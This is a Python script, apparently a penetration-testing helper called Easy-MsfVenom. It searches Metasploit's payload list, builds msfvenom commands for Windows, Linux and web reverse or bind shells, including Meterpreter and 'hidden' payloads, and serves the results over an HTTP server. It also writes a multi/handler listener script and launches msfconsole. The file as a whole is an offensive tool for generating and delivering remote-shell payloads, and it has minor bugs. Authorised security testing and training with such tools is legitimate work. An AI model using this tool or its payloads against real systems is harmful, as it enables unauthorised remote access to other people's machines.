#!/usr/bin/env python3

#-INFO------------------------------------------------------------#
# Search, generate & deliver MsfVenom payloads                    #
# Be as simple as possible BUT with all msfvenom payloads.        #

#-AUTHOR----------------------------------------------------------#
#  Mathieu Dupas                                                  #

#-Licence---------------------------------------------------------#
# http://creativecommons.org/licenses/by-nc/4.0/?ref=chooser-v1   #
#-----------------------------------------------------------------#

import argparse
import textwrap
import socket
import sys
import subprocess
import os


def parse_options():

    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, \
    description= textwrap.dedent('''python3 ./Easy-MsfVenom.py -t win 

Interactive mode:
-----------------
    - Win shells /payloads : ./Easy-MsfVenom.py  -t win
    - Linux shells /payloads : ./Easy-MsfVenom.py  -t lin
    - Web shells /payloads (PHP,ASP, Java) :./Easy-MsfVenom.py  -t web
    
Classics:
---------
    - Meterpreter Win(x86) Staged Bind_TCP payloads:  ./Easy-MsfVenom.py  -t win -m
    - Meterpreter Win(x86) Staged Rev. TCP payloads:  ./Easy-MsfVenom.py  -t win -m -r

Custom search:
---------------
    -  Hidden Meterpreter Windows(x86) Bind_TCP payloads : ./Easy-MsfVenom.py  -t win -m -k hidden

Full control:
------------
    - Meterpreter Win(x64) Stageless Reverse_TCP payloads:  ./Easy-MsfVenom.py  -t win -a x64 -m -s -r -p 4444

        
    '''))
    parser.add_argument("-t", type=str, help="Type of Shell: Win, Lin , Web", dest='SHELL_TYPE')
    parser.add_argument("-m", "--met", help="Specify if Meterpreter shell", action ='store_true')
    parser.add_argument("-a", "--arch",  default="x86", type=str, help="Architecture (default x86) : x86, x64")
    parser.add_argument("-r", "--rev", help="Reverse Shell (default is BIND shell)", action='store_true')
    parser.add_argument("-s", "--stageless", help="Stageless : if specified -> stageless payload", action ='store_true')
    parser.add_argument("-ip", type=str, help="Local Host if Rev shell, Remote Host if Bind Shell")
    parser.add_argument("-p", "--port", type=int, help="Port to connect to")
    parser.add_argument("-k", "--keyword", type=str, help="Search by special keyword (android, Hidden...)")
    parser.add_argument("--update", help="Update Payload list",action ='store_true')
        
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()
    
    return args

def Green(text):
    return "\033[32m{}\033[0m".format(text)

def make_payload_list(txt):
    payload_list = {}
    print("[*] Generating payload list...")
    with open(txt,'r') as file:
    	lines = file.readlines()
    	for i, line in enumerate(lines):
    		payload_list[i] = line
    return payload_list		
  
def print_available_payloads(keywords,payload_list):
	avail_payloads = {}
	for i, p in payload_list.items():
	    match = []
	    temp_payloads ={}
	    for word in keywords.split():
	        if word in p:
	            match.append(True)
	            temp_payloads[i] = p
	            continue
	        else:
	            match.append(False)
	            break
	    if all(match):
	        avail_payloads |= temp_payloads
	#print("match is:", match)
	#print("available payloads", avail_payloads)
	
	if avail_payloads:
	    print(Green("[+] Available payloads: {}".format(len(avail_payloads))))
	    print("-" * 150)
	    for i, p in avail_payloads.items():
	        print("{} : {}".format(i,p))
	    return avail_payloads
	    
	else:
            print("[!] Sorry, no payload found, please check your inputs / combination")
            sys.exit(-1)

def generate_payload(params,number,avail_payloads,pname):
    
    K_TYPE ,K_ARCH,K_MET, K_BIND, K_STAGE, K_EXT, K_KEY, IP, PORT = params
    HOST = "LHOST" if K_BIND == "reverse" else "RHOST" 
    
    payload_cmd =avail_payloads[number].split()[0]
          
    if K_TYPE == "windows":
        payload="msfvenom -p {} {}={} LPORT={} -f exe -o {}".format(payload_cmd,HOST, IP,PORT,pname+".exe")
        
    elif K_TYPE== "linux":
        payload="msfvenom -p {} {}={} LPORT={} -f elf -o {}".format(payload_cmd,HOST, IP,PORT,pname+".elf")
    
    elif args.SHELL_TYPE == "web":
         payload="msfvenom -p {} {}={} LPORT={} -f raw -o {}".format(payload_cmd,HOST, IP,PORT,pname + K_EXT)
         
    
    print("="*150)
    print("[*] Generating Payload")
    print("        -> ",payload)
    print("[*] Please wait ...")    
    #os.system(payload)
    print(Green("[+] DONE ! Payload has been generated. "))
    
    # Deliver payload
    if K_BIND=="bind" :
        os.system('python3 -m http.server 8082') # not the most elegant but very short        
    else:
    # For reverse shell
        if 'meterpreter' in payload : # meterpreter shells
            #msf_cmd= "msfconsole -x \'use multi/handler; set LHOST {}; set LPORT {}; run\'".format(IP,PORT)
            #msf_cmd= "msfconsole -x 'use multi/handler; set LHOST {}; set LPORT {}; run' ".format(IP,PORT)
            
            msf_cmd ='''use multi/handler
            set LHOST {}
            set LPORT {}
            run'''.format(IP,PORT)
            with open("listener.rc","w") as f:
                f.write(msf_cmd)
            
            print(Green("[*] Launching Metasploit ..."))
            subprocess.call("qterminal -e msfconsole -r listener.rc", shell=True)
            
        else: # netcat shell
            msf_cmd = "nc -nlvp {}".format(PORT)
            #subprocess.call(["qterminal" , "-e", msf_cmd], shell=True)  # Problem of double quotes 
            # error generated in metasploit : Parse error: Unmatched double quote: "'''use"

        # Launch metasploit in another terminal
        # works only in Kali and Os with Qterminal
       
        
        #os.system(msf_cmd)

        
    
    return 


if __name__ == "__main__":
       
    args = parse_options()
    if args.update :
        print(Green("[*] Please Wait, updating..."))
        os.system('msfvenom --list payloads > venom-payloads.txt')
        print(Green("[+] udpated !"))
        sys.exit()
    
    payload_list = make_payload_list('venom-payloads.txt')
    
    # extract keywords from command line for later search 
    switch_type = {
    "win" : "windows",
    "lin" : "linux",
    "web" : ["asp","php","tomcat","java"],
    #'script' : ['py', 'ps1', 'pl' ]
     }
    
    if not args.SHELL_TYPE:
        # Special case when we are targeting other Os like android, unix, Mac via --keyword Arg
        K_TYPE =""
        K_EXT=""
    else:
        # Type of payload is given among Win, Lin, Web
        key_type = switch_type.get(args.SHELL_TYPE.lower(),"There is an error in your shell OS type parameter")
        if isinstance (key_type, str):
            K_TYPE= key_type
            K_WEB=""
            K_EXT=""
        else:
            # Paylaod is WEB 
            K_TYPE =""
            print(Green("[+] Available web payloads: 1.PHP 2.WIN-ASP 3.Java-WAR 4.Java-JSP"))
               
            ext_list = ['.php', '.asp','.war','.jsp']
            K_WEB = int(input(Green("[*] Enter your specific type of payload : ")))
            K_EXT= ext_list[K_WEB-1]
            if K_EXT == ".war" or K_EXT == ".jsp":
                K_TYPE = "java"
            elif K_EXT == ".php":
                K_TYPE = "php"
            elif K_EXT == ".asp":
                K_TYPE = "windows"
        
    K_KEY= args.keyword if args.keyword else ""	
    #Get Architecture 
    # Warning: in MSFvenom, when OS = Windows, x86 keyword is never displayed
    # With other payloads like android, we should relax the default x86 arg othrwise we'll found nothing
    if (K_TYPE == "windows" and args.arch=="x86") or (K_KEY):
        K_ARCH=""
    else:
        K_ARCH = args.arch.lower()
    K_MET = "meterpreter" if args.met else ""
    K_BIND = "reverse" if args.rev else "bind"
    K_STAGE = " " if args.stageless else "staged"
    
    
    params = [K_TYPE,K_ARCH,K_MET, K_BIND, K_STAGE,K_EXT, K_KEY]
    keywords_string= " ".join(params)     
    
    
    if args.SHELL_TYPE =="web":
        # WEB payloads don't have K_ARCH, K_STAGE, K_EXT mentionned
        # We should remove those keywords 
        keywords_string= keywords_string.replace(K_ARCH,'')
        keywords_string= keywords_string.replace(K_STAGE,'')
        keywords_string = keywords_string.replace(K_EXT,'')
        
    print(Green("[*] Searching payloads with Keywords: {}".format(keywords_string))) # for debug
    # Print available payloads
    avail_payloads = print_available_payloads(keywords_string,payload_list)    
    i= int(input("[*] Please enter your payload number: "))
    pname = " ".join(keywords_string.split()).replace(" ","-")
    
    # Finally Get IP and PORT or Ask for them
    if args.ip :
        IP = args.ip
    else:
        # Get the IP address
        if K_BIND=="bind" :
            IP=input("[*] Enter the IP target: ")
        else:
            # For reverse shell, automatically fill-in IP 
            IP = subprocess.check_output(["hostname -I | awk '{print $1}'"], shell=True).decode().strip()
            #IP = subprocess.Popen("hostname -I | awk '{print $1}'", shell=True, stdout=subprocess.PIPE).stdout
    if args.port :
        PORT = args.port    
    else:
        PORT = int(input("[*] Enter port number for shell: "))   
    
    params += [IP,PORT]
    generate_payload(params,i,avail_payloads,pname)
    print(Green("[+] Bye ! "))
    
            
